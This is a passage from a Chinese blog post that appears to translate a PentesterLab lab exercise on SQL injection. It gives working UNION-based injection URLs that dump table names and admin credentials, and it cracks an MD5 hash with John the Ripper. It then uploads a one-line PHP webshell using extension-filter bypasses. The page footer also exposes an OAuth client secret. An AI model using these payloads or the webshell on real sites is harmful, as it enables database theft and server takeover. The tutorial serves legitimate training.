+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> firstname,lastname,age,<span class="keyword">groups</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> firstname</span><br></pre></td></tr></table></figure>
+
+<p>上述请求将返回users表按照firstname排序后的结果。<br> <strong>ORDER BY</strong> 也可以用一个整数告诉数据库排序的列数 X：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> firstname,lastname,age,<span class="keyword">groups</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>上述请求将返回users表按照第3列排序后的结果。<br>此功能可用于检测列数，如果表中的列数大于 <strong>ORDER BY</strong> 查询中的列数，则抛出一个错误（例如10）：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Unknown column '10' in 'order clause'</span><br></pre></td></tr></table></figure>
+
+<p>可以使用这个属性来猜列数。例如，如果你可以注入以下语句： <strong>SELECT id,name,price FROM articles where id=1</strong> ，你可以采用以下步骤：  </p>
+<ul>
+<li><strong>SELECT id,name,price FROM articles where id=1 ORDER BY 5</strong> ，注入内容 <strong>1 ORDER BY 5</strong> 将返回一个错误，因为查询的第一部分列数小于5；  </li>
+<li><strong>SELECT id,name,price FROM articles where id=1 ORDER BY 3</strong> ，注入内容 <strong>1 ORDER BY 3</strong> 不会返回错误，因为查询的第一部分列数大于或等于3；  </li>
+<li><strong>SELECT id,name,price FROM articles where id=1 ORDER BY 4</strong> ，注入内容 <strong>1 ORDER BY 4</strong> 将返回一个错误，因为查询的第一部分列数小于4。  </li>
+</ul>
+<p>基于这种二分法的搜索，我们可以知道列数是3，我们现在可以利用这些信息来建立最终的查询：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>,<span class="keyword">name</span>,price <span class="keyword">FROM</span> articles <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>尽管在本例中这种方法使用了相同的请求数，但它的速度会明显加快，当列数增长时。  </p>
+<h2 id="检索信息"><a href="#检索信息" class="headerlink" title="检索信息"></a>检索信息</h2><p>现在我们已经知道了列数，我们可以从数据库中检索信息。基于我们收到的错误信息，我们知道后台使用的数据库是 MySQL 。<br>利用这些信息，我们可以迫使数据库执行一个函数或给我们发送信息：  </p>
+<ul>
+<li>通过PHP应用程序连接到数据库的用户信息，使用 <strong>current_user()</strong>   </li>
+<li>数据库版本信息，使用 <strong>version()</strong>   </li>
+</ul>
+<p>为了实现这些，我们需要在之前的语句（ <strong>UNION SELECT 1,2,3</strong> ）中用我们想要执行的函数替换掉一个值，然后在响应中检索信息。<br>确保你总是保持列数正确当你试图检索信息时。  </p>
+<p>例如你可以访问以下URL来获取这些信息：  </p>
+<ul>
+<li>数据库版本： <strong><a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4" target="_blank" rel="noopener">http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4</a></strong>   </li>
+<li>当前用户： <strong><a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4" target="_blank" rel="noopener">http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4</a></strong>   </li>
+<li>当前数据库： <strong><a href="http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4" target="_blank" rel="noopener">http://vulnerable/cat.php?id=1%20UNION%20SELECT%201,database(),3,4</a></strong>  </li>
+</ul>
+<p>我们现在能够从数据库中检索信息并且检索任意内容。为了获取当前应用程序的相关信息，我们需要：  </p>
+<ul>
+<li>当前数据库中的所有表的名称  </li>
+<li>我们想要从中检索信息的表中列的名称  </li>
+</ul>
+<p>MySQL提供了包含有关数据库，表，列信息的元信息表，MySQL 5版本及以上。我们将使用这些表来获取我们需要的最终要求信息。这些表存储在数据库 <strong>information_schema</strong> 中。<br>下面的查询可用于检索：  </p>
+<ul>
+<li>所有表的列表： <strong>SELECT table_name FROM information_schema.tables</strong>  </li>
+<li>所有列的列表： <strong>SELECT column_name FROM information_schema.columns</strong>   </li>
+</ul>
+<p>通过混合这些查询和以前的URL，你可以猜出什么网页访问用于信息检索：  </p>
+<ul>
+<li>表的列表： <strong>1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables</strong>   </li>
+<li>列的列表： <strong>1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns</strong>   </li>
+</ul>
+<p>问题是，这些查询语句为您提供所有表和列的列表，但在数据库中查询和检索感兴趣的信息，你需要知道哪些列属于哪些表。幸好， <strong>information_schema.columns</strong> 表中储存有列名。  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> table_name,column_name <span class="keyword">FROM</span> information_schema.columns</span><br></pre></td></tr></table></figure>
+
+<p>获取这些信息，我们可以  </p>
+<ul>
+<li>把表名和列名放在不同的注射位置： <strong>1 UNION SELECT 1, table_name, column_name,4 FROM information_schema.columns</strong>   </li>
+<li>在同一个注入位置使用 <strong>CONCAT</strong> 连接表名和列名： <strong>1 UNION SELECT 1,concat(table_name,&#39;:&#39;, column_name),3,4 FROM information_schema.columns</strong> 。 <strong>&#39;:&#39;</strong> 很容易分割查询结果。  </li>
+</ul>
+<p>如果你想轻松的在结果页面使用正则表达式检索信息（比如你想写一个SQL注入的脚本），你可以使用一个标记在注入内容 <strong>``1 UNION SELECT 1,concat(‘^^^’,table_name,’:’,column_name,’^^^’) FROM information_schema.columns`</strong> 中。它很容易在页面中匹配结果。  </p>
+<p>你现在有表和它们的列的列表，第一个表和列是默认的MySQL表。在HTML页面的最后，我们可以看到一个表的列表可能被目前的应用所使用：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031605.png" alt=""></p>
+<p>使用此信息，您现在可以创建一个查询，从该表中检索信息：  </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">concat</span>(login,<span class="string">':'</span>,<span class="keyword">password</span>),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">FROM</span> <span class="keyword">users</span>;</span><br></pre></td></tr></table></figure>
+
+<p>并获取用户名和密码用于访问管理页面：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031606.png" alt=""></p>
+<p>该SQL注入提供和访问数据库连接的应用程序使用用户相同的权限(current_user())…这就是为什么当你在部署WEB应用的时候尽可能给它的用户最低权限。  </p>
+<h1 id="访问管理页面和代码执行"><a href="#访问管理页面和代码执行" class="headerlink" title="访问管理页面和代码执行"></a>访问管理页面和代码执行</h1><hr>
+<h2 id="破解密码"><a href="#破解密码" class="headerlink" title="破解密码"></a>破解密码</h2><p>使用2种不同的方法可以很容易的破解密码：  </p>
+<ul>
+<li>一个搜索引擎  </li>
+<li>John-The-Ripper <a href="http://www.openwall.com/john/" target="_blank" rel="noopener" title="http://www.openwall.com/john/">http://www.openwall.com/john/</a>  </li>
+</ul>
+<p>如果哈希值无盐，它可以轻易被破解，通过使用搜索引擎像谷歌。因为，只要搜索哈希，你将在很多网站看到你的密码的明文版：  </p>
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/old_images/master/2015031607.png" alt=""></p>
+<p>John-The-Ripper可以用来破解这个密码，最现代的Linux发行版包括一个版本的John，为了破解这个密码，你需要告诉John什么算法被用于加密。对于Web应用程序，一个好的猜测是MD5。<br>在大多数的Linux发行版中，只提供支持少数格式的John-The-Ripper版本。你可以运行John不带任何参数，从使用信息中获取支持的格式列表。例如在Fedora，支持以下格式：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> john</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ...usage information...</span></span><br><span class="line">--format=NAME              force hash type NAME: DES/BSDI/MD5/BF/AFS/LM/crypt</span><br><span class="line"><span class="meta">#</span><span class="bash"> ...usage information...</span></span><br></pre></td></tr></table></figure>
+
+<p>不幸的是，这个有效的MD5并不是通过PHP的md5函数M创建的。为了破解这个密码，我们将需要一个支持raw-md5的新版本John。官网提供有支持raw-md5的社区增强版。  </p>
+<p>现在我们需要给John提供正确的格式信息，我们需要把用户名和密码放在同一行用冒号“：”分开。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin:8efe310f9ab3efeae8d410a8e0166eb2</span><br></pre></td></tr></table></figure>
+
+<p>下面的命令行可以用来在破解密码之前检索：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./john password --format=raw-md5  --wordlist=dico --rules</span></span><br></pre></td></tr></table></figure>
+
+<p>使用以下选项：  </p>
+<ul>
+<li><strong>password</strong> 告诉John什么文件包含密码的哈希值  </li>
+<li><strong>–format=raw-md5</strong> 告诉John密码哈希是raw-md5格式  </li>
+<li><strong>–wordlist=dico</strong> 告诉John使用文件 <strong>dico</strong> 作为字典  </li>
+<li><strong>–rules</strong> 告诉John尝试遍历每个可用的单词  </li>
+</ul>
+<p>John输出匹配的哈希数：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Loaded 1 password hash (Raw MD5 [SSE2 16x4x2 (intr)])</span><br></pre></td></tr></table></figure>
+
+<p>这提供了一个提示，正确的格式。  </p>
+<p>你可以很快的获取到密码：  </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./john password --format=raw-md5  --wordlist=dico --rules</span></span><br><span class="line">Loaded 1 password hash (Raw MD5 [SSE2 16x4x2 (intr)])</span><br><span class="line">P4ssw0rd         (admin)</span><br></pre></td></tr></table></figure>
+
+<h2 id="上传WebShell并且执行代码"><a href="#上传WebShell并且执行代码" class="headerlink" title="上传WebShell并且执行代码"></a>上传WebShell并且执行代码</h2><p>一旦进入了管理页面，下一个目标是找到在操作系统上执行命令的方法。  </p>
+<p>我们可以看到，有一个文件上传功能允许用户上传图片，我们可以利用这个功能来上传一个PHP脚本。这个PHP脚本一旦上传到服务器会给我们提供一种方式，运行PHP代码和命令。  </p>
+<p>首先我们需要创建一个PHP脚本运行命令。下面是一个简单的和最小的网页木马的源代码：  </p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  system($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个脚本的内容为执行调用系统命令cmd。它需要被保存为一个带.php扩展名的文件。例如 <strong>shell.php</strong> 可以作为文件名。  </p>
+<p>我们现在可以使用页面 <strong><a href="http://vulnerable/admin/new.php" target="_blank" rel="noopener">http://vulnerable/admin/new.php</a></strong> 提供的上传功能来尝试上传这个脚本。  </p>
+<p>我们可以看到，脚本没有正确上传到服务器上。应用阻止.php扩展名扩展名的文件上传。但是我们可以尝试：  </p>
+<ul>
+<li><strong>.php3</strong> 会绕过对 <strong>.php</strong> 的简单过滤   </li>
+<li><strong>.php.test</strong> 会绕过对 <strong>.php</strong> 的简单过滤,并且Apache仍然会使用 <strong>.php</strong> 来解析，因为配置中不存在对 <strong>.test</strong> 的处理。  </li>
+</ul>
+<p>现在，我们需要找到这个PHP脚本，管理上传到Web服务器的文件。我们需要确保文件直接用于Web客户端。我们可以访问新上传的图像的页面，看到 <strong>&lt;img</strong> 标记指向：  </p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>Last picture: Test shell<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"inner"</span> <span class="attr">align</span>=<span class="string">"center"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"admin/uploads/shell.php3"</span> <span class="attr">alt</span>=<span class="string">"Test shell"</span> /&gt;</span> <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>你现在可以访问下面的地址并且开始运行命令通过使用cmd参数。例如，访问 <strong><a href="http://vulnerable/admin/uploads/shell.php3?cmd=uname" target="_blank" rel="noopener">http://vulnerable/admin/uploads/shell.php3?cmd=uname</a></strong> 会在操作系统上运行命令 <strong>uname</strong> 并且返回当前内核( <strong>Linux</strong> )。<br>其他命令可以用来获取更多信息:  </p>
+<ul>
+<li><strong>uname -a</strong> 来获得当前内核的版本；  </li>
+<li><strong>ls</strong> 来获取当前目录的内容；  </li>
+<li>…  </li>
+</ul>
+<p>这个webshell拥有运行PHP脚本的Web服务器相同的权限，例如你不能访问文件 <strong>/etc/shadow</strong>因为web服务器不能访问这个文件（当你应该尝试假设管理员错误的改变了这个文件的权限）。  </p>
+<p>每个命令都是运行在一个全新的上下文，独立于前面的命令， 你不能通过运行 <strong>cd</strong> 和 <strong>ls</strong>来获取 <strong>/etc/</strong> 目录中的内容，因为第二条命令是一个新的上下文。想要获得 <strong>/etc/</strong> 目录中的内容，你需要运行 <strong>ls /etc/</strong> 。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个练习将教你如何手动检测和利用SQL注入进入管理页面。一旦进入“信任区”，更多可用的功能将产生更多的漏洞。  </p>
+<p>这个练习基于几年前对网站进行渗透测试的结果，但存在这类漏洞的网站今天仍可以在互联网上找到。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    最終更新：<time datetime="2019-08-28T07:12:13.358Z" itemprop="dateUpdated">2019-08-28 15:12:13</time>
+</span><br>
+
+
+        
+        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
+        
+    </div>
+    
+    <footer>
+        <a href="https://darkwing.moe">
+            <img src="/img/avatar.jpg" alt="暗羽">
+            暗羽
+        </a>
+    </footer>
+</blockquote>
+
+        
+<div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pentesterlab/" rel="tag">Pentesterlab</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/&title=《From SQL Injection to Shell》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/&title=《From SQL Injection to Shell》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《From SQL Injection to Shell》 — 喵喵喵喵&url=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2015/03/20/From-SQL-Injection-to-Shell-II/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">From SQL Injection to Shell II</h4>
+      </a>
+    </div>
+  
+
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<section class="comments" id="comments">
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+        var id = location.pathname
+        if (location.pathname.length > 50) {
+          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
+        }
+        const gitalk = new Gitalk({
+          clientID: 'd35074a248599729ad26',
+          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
+          repo: 'BlogComments',
+          owner: 'zjicmDarkWing',
+          admin: ['zjicmDarkWing'],
+          id: id,      // Ensure uniqueness and length less than 50
+          title: document.title.split('|')[0],
+          distractionFreeMode: false  // Facebook-like distraction free mode
+        })
+
+        gitalk.render('gitalk-container')
+    </script>
+</section>
+
+
+
+
+</article>
+
+<div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        谢谢大爷~
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/wechat.png" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/wechat.png" data-alipay="/img/alipay.jpeg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>このブログの内容物は<a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.ja" target="_blank">クリエイティブ・コモンズ 表示 - 非営利 - 継承 4.0 国際ライセンスの下に提供されています</a></span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>暗羽 &copy; 2014 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/&title=《From SQL Injection to Shell》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/&title=《From SQL Injection to Shell》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《From SQL Injection to Shell》 — 喵喵喵喵&url=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2015/03/16/From-SQL-Injection-to-Shell/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACJUlEQVR42u3aQY7DMAgF0N7/0pntLJr0A2ml2M+rqrIcvw3CwOsVr+NkJfv//5P8vj55tDAwMB7LOC5Xsif58PXO3ncxMDB2Y5wdfb0nD7U9anI3DAwMjLM91//k4TVPHDEwMDB6jDyh7IVmDAwMjOqFrgPrpAxXPR8DA2M3Rv40/f3vr/Q3MDAwHsU4iute6m23wsDAWJrROzpP9ZKnb97m/LATAwNjUcb1cUnBKy+0TcbCPsAwMDCWZlRbkpNL9EbNqm1UDAyM9Rh5i7EamucF/eRuha0YGBgPZ/QaA3k6mAfQPEy/CbgYGBgbMJLQNh+SSJLRcrDGwMBYmlGtWSVPynnRLQn0hWoiBgbGQoxJUawXsnuYD09cDAyMpRl5w3L0geKefFADAwNjVUY+gFUdzsifoL1hizdjYRgYGIsyqpcrzG6Md5ZPw8DAWJpRbUzmR1cDbp44RjMaGBgYSzB+05K891unQRYDA2NRRlII6yWIk53VfzAwMHZgzBPByUhrb+fpWxwDA2NpxnXCNy/95w3L5pkYGBgbMPKAeNcgRbWsVhgFw8DAWIhxFNc8TUyudUNSiIGBsRDj2w3O3qBGXuwrYzAwMB7LSIJsdcBrEih7IxoYGBg7MPJAmad0vWGL6gwYBgYGxoRaDc35E/cVxWAMDIx9Gfmzs1c+q5b2MDAw9mHkA17VBuRkFOMr5TYMDIwHMkZPx1Yad9egGAYGxgaMP6g6S6ljCg2SAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
